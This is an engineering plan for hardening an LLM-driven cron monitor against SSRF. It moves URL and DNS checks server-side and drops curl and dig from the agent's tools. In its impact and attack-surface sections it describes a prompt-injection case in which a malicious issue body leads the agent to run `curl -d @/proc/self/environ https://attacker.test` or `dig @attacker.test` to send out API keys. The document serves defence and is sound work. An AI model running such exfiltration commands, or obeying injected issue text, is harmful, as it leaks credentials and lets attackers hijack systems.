---
title: "fix: SSRF hardening for cron-follow-through-monitor via Set.has() allowlist"
type: fix
date: 2026-05-26
lane: single-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
---

# fix: SSRF hardening for cron-follow-through-monitor via Set.has() allowlist

## Overview

Implement server-side URL validation in `cron-follow-through-monitor.ts` BEFORE
the LLM agent runs, closing the SSRF gap documented in issue #4068 (deferred
from TR9 PR-2 #4063). The current dual-defense (Layer 1: in-prompt guard; Layer
2: `buildSpawnEnv()` env-allowlist) relies on the LLM faithfully obeying the
prompt's HTTPS-and-non-RFC1918 guard -- which is bypassable via prompt injection,
DNS rebinding, URL-parser inconsistencies, IPv6, URL-userinfo abuse, percent-
encoded forms, and `dig`-based DNS exfil (all 7 gaps enumerated in #4068's body).

The fix adds **Layer 3 (mechanical, server-side)**: a `validatePredicateUrls()`
function that:

1. Fetches open follow-through issues via `gh issue list`.
2. Parses each issue's YAML verification block to extract `type` + `url` / `domain`.
3. For `http-200` predicates: resolves the URL hostname via `dns.lookup()`,
   validates the resolved IP is public using `ipaddr.js`, and validates the
   hostname against a hardcoded `Set<string>` of permitted hosts.
4. For `dns-txt` / `dns-a` predicates: validates the domain against the same
   host allowlist.
5. Passes ONLY the validated predicate set into the agent prompt.
6. Removes `Bash(curl:*)` and `Bash(dig:*)` from `--allowedTools` -- the agent
   no longer needs network verbs because server-side `fetch()` executes the
   HTTP predicate and `dns.resolve()` executes the DNS predicate.

## Problem Statement / Motivation

The current SSRF defense is dual-layered (learning
`2026-05-19-llm-bash-allowlist-network-verbs-dual-defense-and-cross-reconcile.md`):

- **Layer 1** (in-prompt): LLM-policed HTTPS-and-non-RFC1918 guard. Bypassable
  via prompt injection, IPv6 (`::1`, `fe80::`, `fc00::`, `::ffff:127.0.0.1`),
  cloud metadata hostnames (`metadata.google.internal`), URL-userinfo forms,
  DNS rebinding, percent-encoded IPs, and numeric IP forms.
- **Layer 2** (mechanical): `buildSpawnEnv()` limits subprocess env to 5 vars.
  Caps blast radius but does NOT prevent exfil of `ANTHROPIC_API_KEY` + `GH_TOKEN`.

Neither layer prevents the agent from being instructed (via prompt injection
through a malicious follow-through issue body) to `curl` internal services or
`dig @attacker.test` for DNS-based exfil. The `Bash(curl:*)` and `Bash(dig:*)`
entries in `--allowedTools` are the widest attack surface on this function.

Learning `2026-03-20-open-redirect-allowlist-validation.md` established that
`Set.has()` exact-match against a hardcoded allowlist is strictly superior to
regex, URL parsing, or substring checks for URL validation -- zero bypass
surface, fail-closed by construction.

## Proposed Solution

**Architecture: server-side predicate execution replaces agent-side execution.**

Instead of the agent running `curl`/`dig` inside `Bash()`, the server resolves
and executes predicates BEFORE the agent runs. The agent receives a pre-validated
summary of predicate results and acts on state transitions only (commenting,
labeling, closing). This eliminates the SSRF surface entirely -- the agent has
no network verbs in its allowlist.

### Key Design Decisions

1. **`ipaddr.js` for IP range classification** (new dependency, zero deps,
   MIT, 37 versions, well-maintained). `node:net.isIP()` identifies address
   family but cannot classify ranges (loopback, private, link-local, etc.).
   `ipaddr.js` provides `.range()` which returns `"loopback"`, `"private"`,
   `"linkLocal"`, `"unicast"` etc. -- exactly what the validation needs.
   Rolling our own IP-range classifier would be error-prone and missing
   edge cases (IPv4-mapped IPv6, 6to4, Teredo, etc.).

2. **Hardcoded `Set<string>` of permitted hosts** -- not regex, not substring,
   not configurable at runtime. Adding a new host requires a code change +
   review + deploy. This is intentional: the follow-through corpus is small
   (~8 active issues, max ~10 per re-evaluation criterion) and changes
   infrequently. The hosts are derived from the current production corpus:
   - `app.soleur.ai` (health endpoint checks)
   - `api.github.com` (ruleset / workflow-run checks)
   - `api.doppler.com` (secret-presence checks)

3. **DNS resolution at validation time** -- `dns.lookup()` resolves the
   hostname and the resolved IP is checked against `ipaddr.js`. This
   catches DNS rebinding attacks at the validation boundary (not at curl
   execution time when the DNS may have changed). For `dns-txt`/`dns-a`
   predicates, the domain is validated against the allowlist without
   IP resolution (dig runs against the authoritative DNS, not the host).

4. **Server-side `fetch()` for http-200 predicates** -- replaces `curl`.
   Uses `AbortSignal.timeout(10_000)` to bound request duration. Only
   checks HTTP status code (200 = pass). No body parsing, no redirect
   following (`redirect: "error"`).

5. **Server-side `dns.resolve()` for dns-txt/dns-a predicates** -- replaces
   `dig`. Uses `dns/promises` with a 10s timeout. Compares resolved values
   against the `expected` field from the YAML predicate.

6. **Prompt restructuring** -- the agent prompt drops the `curl`/`dig`
   instructions (step 3c) and receives a `## Pre-Validated Predicate Results`
   block injected at runtime. The agent acts on state transitions only.

## User-Brand Impact

- **If this lands broken, the user experiences:** follow-through issues not
  being auto-verified or auto-closed (monitoring goes dark). The agent would
  skip predicates it cannot validate, leaving issues open past SLA.
- **If this leaks, the user's data/workflow is exposed via:** without this
  fix, a malicious follow-through issue body could instruct the agent to
  `curl -d @/proc/self/environ https://attacker.test` and exfiltrate
  `ANTHROPIC_API_KEY` + `GH_TOKEN` from the subprocess environment. This
  is the attack vector #4068 was filed to close.
- **Brand-survival threshold:** `single-user incident` -- a single compromised
  `ANTHROPIC_API_KEY` or `GH_TOKEN` would require immediate rotation across
  all infrastructure, and the `GH_TOKEN` grants write access to the repository.

## Attack Surface Enumeration

All code paths that touch the SSRF surface being fixed:

1. **`Bash(curl:*)` in `--allowedTools`** -- the agent can run any `curl`
   invocation including `-d @/proc/self/environ`, `-F file=@/path`,
   `-X DELETE -H "Authorization: bearer $GH_TOKEN"`. **Fixed by removal.**
2. **`Bash(dig:*)` in `--allowedTools`** -- the agent can run `dig @attacker.test`
   for DNS-based exfil, or resolve internal hostnames. **Fixed by removal.**
3. **In-prompt HTTPS-and-non-RFC1918 guard (Layer 1)** -- LLM-policed, bypassable
   via all 7 vectors in #4068. **Downgraded from load-bearing to defense-in-depth;
   Layer 3 becomes load-bearing.**
4. **`buildSpawnEnv()` (Layer 2)** -- mechanical env-var allowlist. **Unchanged;
   remains as blast-radius cap for any remaining Bash tools.**
5. **Issue body YAML parsing** -- the agent parses untrusted YAML from issue
   bodies. **Moved server-side; agent no longer parses YAML directly.**

### Unchecked paths (justification)

- **`Bash(gh issue list:*)`, `Bash(gh issue view:*)`, etc.** -- these are
  GitHub API calls authenticated with `GH_TOKEN`. The agent needs these to
  read issue state, post comments, and close issues. The `GH_TOKEN` scope
  should be minimized at the operator level (fine-grained PAT, repo-scoped).
  These are NOT SSRF vectors -- they target `api.github.com` only.
- **`Read`, `Glob`, `Grep`** -- filesystem-only tools. No network access.

## Observability

```yaml
liveness_signal:
  what: Sentry cron monitor "scheduled-follow-through" heartbeat
  cadence: per-run (weekday 09:00 UTC via Inngest cron)
  alert_target: Sentry issue alert -> operator email
  configured_in: apps/web-platform/infra/sentry/cron-monitors.tf

error_reporting:
  destination: Sentry web-platform via reportSilentFallback
  fail_loud: >
    New log line: "predicate-validation: N of M predicates rejected" at
    logger.warn level. Sentry heartbeat status=error if claude-eval
    exits non-zero.

failure_modes:
  - mode: DNS resolution timeout during predicate validation
    detection: reportSilentFallback with feature "predicate-validation"
    alert_route: Sentry issue -> operator email
  - mode: All predicates rejected (empty validated set)
    detection: logger.warn "predicate-validation: 0 of N predicates passed"
    alert_route: Sentry via reportSilentFallback (empty-validated-set)
  - mode: ipaddr.js parse failure on resolved IP
    detection: try/catch in validateResolvedIp, reportSilentFallback
    alert_route: Sentry issue
  - mode: Allowlist too restrictive (legitimate host not in Set)
    detection: Predicate marked "rejected" in validation log; follow-through issue stays open past SLA
    alert_route: needs-attention label on the follow-through issue (existing Guard B)

logs:
  where: journalctl -u inngest.service (Hetzner node)
  retention: 30 days (systemd journal default)

discoverability_test:
  command: >
    curl -s https://app.soleur.ai/api/inngest 2>/dev/null | head -c 200
  expected_output: Inngest function registration response (confirms inngest endpoint is live)
```

## Acceptance Criteria

### Pre-merge (PR)

- [ ] AC1: New file `apps/web-platform/server/inngest/functions/_predicate-validator.ts`
  exports `validatePredicateUrls()` and `ALLOWED_PREDICATE_HOSTS` (a `Set<string>`).
- [ ] AC2: `ALLOWED_PREDICATE_HOSTS` contains exactly: `app.soleur.ai`,
  `api.github.com`, `api.doppler.com`. Verified by:
  `grep -c "ALLOWED_PREDICATE_HOSTS" apps/web-platform/server/inngest/functions/_predicate-validator.ts`
  returns 1 (exported const definition).
- [ ] AC3: `validatePredicateUrls()` rejects URLs whose resolved IP falls in
  any non-unicast range (loopback, private, linkLocal, uniqueLocal, reserved,
  unspecified, broadcast, carrierGradeNat, as classified by `ipaddr.js`).
- [ ] AC4: `validatePredicateUrls()` rejects URLs whose hostname is not in
  `ALLOWED_PREDICATE_HOSTS` (Set.has exact-match, case-insensitive via
  `.toLowerCase()`).
- [ ] AC5: `cron-follow-through-monitor.ts` `CLAUDE_CODE_FLAGS` no longer
  contains `Bash(curl:*)` or `Bash(dig:*)`. Verified by:
  `grep -c 'Bash(curl' apps/web-platform/server/inngest/functions/cron-follow-through-monitor.ts`
  returns 0.
- [ ] AC6: `cron-follow-through-monitor.ts` adds a new step.run
  `"validate-predicates"` that calls `validatePredicateUrls()` BEFORE
  `"claude-eval"`. The step returns the validated predicate results.
- [ ] AC7: The `FOLLOW_THROUGH_PROMPT` is restructured: step 3c (curl/dig
  execution) is replaced with a reference to the injected
  `## Pre-Validated Predicate Results` block. The agent acts on pre-validated
  results, not raw issue body URLs.
- [ ] AC8: Server-side `fetch()` for http-200 predicates uses
  `redirect: "error"` (no redirect following) and
  `AbortSignal.timeout(10_000)` (10s timeout).
- [ ] AC9: Server-side `dns.resolve()` for dns-txt/dns-a predicates uses
  a 10s timeout.
- [ ] AC10: `ipaddr.js` is added to `apps/web-platform/package.json`
  dependencies. Verified by:
  `grep '"ipaddr.js"' apps/web-platform/package.json` returns a line.
- [ ] AC11: Test file
  `apps/web-platform/test/server/inngest/predicate-validator.test.ts` exists
  with tests covering: (a) public host in allowlist passes, (b) public host
  NOT in allowlist fails, (c) private IPv4 (10.x, 172.16.x, 192.168.x) fails,
  (d) loopback (127.0.0.1, ::1) fails, (e) link-local (169.254.x.x, fe80::)
  fails, (f) IPv4-mapped IPv6 (::ffff:127.0.0.1) fails, (g) URL-userinfo
  forms rejected, (h) non-HTTPS scheme rejected.
- [ ] AC12: Existing test file
  `apps/web-platform/test/server/inngest/cron-follow-through-monitor.test.ts`
  updated: T1 spawn call no longer includes `Bash(curl:*)` or `Bash(dig:*)`
  in args; new assertion that step.calls includes `"validate-predicates"`.
- [ ] AC13: `npm test` passes in `apps/web-platform/` (vitest, not bun test).

### Post-merge (operator)

- [ ] AC14: After first weekday 09:00 UTC cron fire post-deploy, verify
  Sentry monitor `scheduled-follow-through` received a heartbeat.
  `Automation: inngest send cron/follow-through-monitor.manual-trigger`
  can trigger a manual run for verification.

## Test Scenarios

- Given a follow-through issue with `type: http-200` and
  `url: https://app.soleur.ai/api/health`, when `validatePredicateUrls()` runs,
  then the URL passes validation (host in allowlist, resolved IP is public).
- Given a follow-through issue with `type: http-200` and
  `url: https://evil.test/steal`, when `validatePredicateUrls()` runs,
  then the URL is rejected (host not in allowlist).
- Given a follow-through issue with `type: http-200` and
  `url: http://app.soleur.ai/api/health` (HTTP not HTTPS), when
  `validatePredicateUrls()` runs, then the URL is rejected (non-HTTPS scheme).
- Given a follow-through issue with `type: http-200` and
  `url: https://127.0.0.1/steal`, when `validatePredicateUrls()` runs,
  then the URL is rejected (loopback IP).
- Given a follow-through issue with `type: http-200` and
  `url: https://10.0.0.1@app.soleur.ai/`, when `validatePredicateUrls()` runs,
  then the URL is rejected (URL-userinfo abuse; hostname parses as
  `app.soleur.ai` but userinfo contains private IP -- reject any URL with
  userinfo).
- Given a follow-through issue with `type: dns-txt` and
  `domain: soleur.ai`, when the domain is NOT in `ALLOWED_PREDICATE_HOSTS`,
  then the predicate is rejected.
- Given a follow-through issue with missing/malformed YAML, when
  `validatePredicateUrls()` parses the issue body, then the issue is treated
  as `type: manual` (no URL validation needed, pass through).
- Given ALL predicate URLs are rejected, when the agent prompt is constructed,
  then the `## Pre-Validated Predicate Results` block shows all predicates as
  "REJECTED" and the agent skips them gracefully.

## Implementation Phases

### Phase 0: Preconditions

- [ ] Verify `ipaddr.js` API: install locally and run
  `node -e "const ip = require('ipaddr.js'); console.log(ip.parse('127.0.0.1').range())"`.
  Expected: `"loopback"`.
- [ ] Verify `node:dns/promises` is available:
  `node -e "const dns = require('dns/promises'); dns.resolve4('app.soleur.ai').then(r => console.log(r))"`.
- [ ] Verify `new URL()` correctly rejects userinfo: `new URL('https://user:pass@host/').username`.

### Phase 1: Add `ipaddr.js` dependency

- [ ] Add `ipaddr.js` to `apps/web-platform/package.json` dependencies.
- [ ] Run `npm install` in `apps/web-platform/`.

### Phase 2: Create `_predicate-validator.ts`

New file: `apps/web-platform/server/inngest/functions/_predicate-validator.ts`

Exports:
- `ALLOWED_PREDICATE_HOSTS: Set<string>` -- the hardcoded allowlist
- `isPublicIp(ip: string): boolean` -- uses `ipaddr.js` to classify
- `validatePredicateUrl(url: string): Promise<{ valid: boolean; reason?: string }>`
- `executeHttpPredicate(url: string): Promise<{ passed: boolean; statusCode: number | null; error?: string }>`
- `executeDnsPredicate(type: "dns-txt" | "dns-a", domain: string, expected: string): Promise<{ passed: boolean; result?: string; error?: string }>`
- `validateAndExecutePredicates(issues: ParsedFollowThroughIssue[]): Promise<ValidatedPredicate[]>`

The module follows the `resolve-origin.ts` pattern: pure functions with no
framework dependencies, testable with vitest directly.

### Phase 3: Update `cron-follow-through-monitor.ts`

- [ ] Add `"validate-predicates"` step.run BEFORE `"claude-eval"`.
- [ ] In validate-predicates: fetch open follow-through issues via `gh issue list`
  (using `spawn("gh", ["issue", "list", ...])` same pattern as ensure-labels),
  parse YAML predicates, call `validateAndExecutePredicates()`.
- [ ] Update `CLAUDE_CODE_FLAGS`: remove `Bash(curl:*)` and `Bash(dig:*)`.
- [ ] Update `FOLLOW_THROUGH_PROMPT`: remove step 3c (curl/dig instructions),
  add reference to `## Pre-Validated Predicate Results` block.
- [ ] Inject validated predicate results into the prompt at runtime by
  appending the results block to `FOLLOW_THROUGH_PROMPT`.
- [ ] Update file-header SSRF comment: change from "DUAL" to "TRIPLE" and
  document Layer 3 as the new load-bearing defense.

### Phase 4: Update existing tests

- [ ] Update `cron-follow-through-monitor.test.ts`:
  - T1: verify `Bash(curl:*)` and `Bash(dig:*)` absent from spawn args.
  - T1: verify step.calls includes `"validate-predicates"` before `"claude-eval"`.
  - Mock the gh issue list spawn in the validate-predicates step.

### Phase 5: New tests for `_predicate-validator.ts`

New file: `apps/web-platform/test/server/inngest/predicate-validator.test.ts`

Test cases (mock `dns.lookup`, `fetch`, `dns.resolve`):
- Public host in allowlist + public IP -> valid
- Public host NOT in allowlist -> invalid
- Private IPv4 ranges (10.x, 172.16.x, 192.168.x) -> invalid
- Loopback (127.0.0.1, ::1) -> invalid
- Link-local (169.254.x.x, fe80::) -> invalid
- IPv4-mapped IPv6 (::ffff:127.0.0.1) -> invalid
- IPv6 unique-local (fc00::) -> invalid
- URL with userinfo -> invalid
- Non-HTTPS URL -> invalid
- DNS lookup timeout -> graceful failure with error
- fetch timeout -> graceful failure with error
- http-200 predicate: 200 response -> passed
- http-200 predicate: non-200 response -> not passed
- dns-txt predicate: expected value found -> passed
- dns-a predicate: expected IP found -> passed
- Malformed YAML -> treated as manual type

## Files to Edit

- `apps/web-platform/package.json` -- add `ipaddr.js` dependency
- `apps/web-platform/server/inngest/functions/cron-follow-through-monitor.ts` -- add validate-predicates step, update prompt, update CLAUDE_CODE_FLAGS
- `apps/web-platform/test/server/inngest/cron-follow-through-monitor.test.ts` -- update assertions

## Files to Create

- `apps/web-platform/server/inngest/functions/_predicate-validator.ts` -- new module
- `apps/web-platform/test/server/inngest/predicate-validator.test.ts` -- new tests

## Open Code-Review Overlap

None

## Risks & Mitigations

| Risk | Mitigation |
|------|-----------|
| `ipaddr.js` adds a new dependency | Zero transitive deps, MIT, 37 versions, well-maintained. Alternative (rolling our own IPv6 range classifier) is error-prone per #4068 issue body. |
| DNS resolution at validation time may differ from curl execution time (TOCTOU) | Acceptable: validation happens seconds before agent runs. DNS rebinding with sub-second TTL is theoretical at follow-through corpus scale (~8 issues). The alternative (no resolution) leaves IPv6 and numeric IP forms unaddressed. |
| Legitimate follow-through host not in allowlist | Fail-safe: issue stays open past SLA, Guard B fires needs-attention label, operator adds host to allowlist in a code change. Better than fail-open (SSRF). |
| Server-side fetch may behave differently from curl (redirects, TLS, SNI) | `redirect: "error"` matches the monitoring intent (status check, not content fetch). TLS/SNI handled by Node.js built-in. |
| Removing curl/dig from agent breaks manual-type predicates | Manual-type predicates have no automated check (prompt step 3c already says "No automated check. Only track SLA."). No curl/dig needed. |

## Alternative Approaches Considered

| Approach | Why rejected |
|----------|-------------|
| Keep agent-side curl/dig with tightened prompt | Prompt-based guards are bypassable via prompt injection. This is the current state and the reason #4068 was filed. |
| Regex-based URL validation (no allowlist) | Regex has bypass surface (encoding, numeric forms, IPv6). Set.has() is strictly superior per learning `2026-03-20-open-redirect-allowlist-validation.md`. |
| Runtime-configurable allowlist (env var / config file) | Over-engineering for ~3 hosts that change rarely. Hardcoded Set is simpler, auditable, fail-closed. |
| Use `node:net` only (no ipaddr.js) | `node:net.isIP()` identifies family but cannot classify ranges. Would require manually implementing IPv4/IPv6 range checks for loopback, private, link-local, unique-local, carrier-grade NAT, IPv4-mapped IPv6, 6to4, Teredo. Error-prone and incomplete. |

## References

- Issue: #4068 (SSRF hardening deferred scope-out)
- Parent epic: #3244
- Umbrella: #3948 (TR9 group-(c) agent-loop crons)
- Learning: `knowledge-base/project/learnings/2026-03-20-open-redirect-allowlist-validation.md`
- Learning: `knowledge-base/project/learnings/2026-05-19-llm-bash-allowlist-network-verbs-dual-defense-and-cross-reconcile.md`
- Learning: `knowledge-base/project/learnings/2026-05-21-follow-through-template-host-drift-and-qa-spawned-feature.md`
- Reference implementation: `apps/web-platform/lib/auth/resolve-origin.ts` (Set.has pattern)
- Reference implementation: `apps/web-platform/lib/auth/validate-origin.ts` (getAllowedOrigins)

## Domain Review

**Domains relevant:** Engineering (CTO), Legal (CLO)

### Engineering (CTO)

**Status:** reviewed
**Assessment:** Security hardening of an existing LLM-driven cron function.
The Set.has() pattern has established precedent in the codebase
(`resolve-origin.ts`). The new dependency (`ipaddr.js`) is justified because
`node:net` cannot classify IP ranges. The architecture moves predicate
execution server-side, which is the correct direction for defense-in-depth.
No concerns.

### Legal (CLO)

**Status:** reviewed
**Assessment:** The fix closes a credential-exfiltration vector
(`ANTHROPIC_API_KEY` + `GH_TOKEN`) that would require breach notification
under GDPR Art. 33/34 if exploited. No new data processing activities
introduced. The server-side DNS resolution is ephemeral (not logged or
stored). No compliance gaps.

### Product/UX Gate

Not applicable -- no user-facing UI changes. Pure server-side security
hardening.

## Sharp Edges

- The `ALLOWED_PREDICATE_HOSTS` Set must be updated manually when new
  follow-through predicate hosts are needed. This is by design (fail-closed).
  If a new host is needed, the operator will see the follow-through issue
  stay open past SLA, Guard B will fire needs-attention, and the operator
  adds the host in a code PR.
- A plan whose `## User-Brand Impact` section is empty, contains only
  `TBD`/`TODO`/placeholder text, or omits the threshold will fail
  `deepen-plan` Phase 4.6. Fill it before requesting deepen-plan or `/work`.
- The `validate-predicates` step.run executes BEFORE `claude-eval`. If it
  fails (DNS timeout, gh CLI error), the function should still proceed to
  `claude-eval` with an empty validated set -- the agent will skip automated
  checks and treat all predicates as manual. This preserves the SLA-tracking
  behavior even when validation is degraded.
- When `ipaddr.js` encounters an IPv4-mapped IPv6 address (`::ffff:10.0.0.1`),
  it must be detected as private. Verify via test that `ipaddr.parse("::ffff:10.0.0.1").range()`
  returns `"private"` or that the IPv4-mapped form is unwrapped before range check.
